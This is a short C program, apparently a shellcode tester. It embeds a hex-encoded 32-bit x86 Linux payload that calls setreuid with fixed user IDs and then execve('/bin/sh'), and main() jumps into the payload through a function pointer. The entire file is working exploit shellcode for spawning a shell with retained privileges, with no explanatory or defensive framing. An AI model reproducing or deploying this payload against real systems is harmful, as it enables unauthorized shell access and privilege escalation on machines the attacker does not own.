#include <unistd.h>

char code[] = "\x6A\x46\x58\xBB\xB7\x04\x00\x00\xB9\x53\x04\x00\x00\xCD\x80\x31\xD2\x6A\x0B\x58\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80";
 

int main(int argc, char **argv)

{

/*creating a function pointer*/

int (*func)();

func = (int (*)()) code;

(int)(*func)();

}
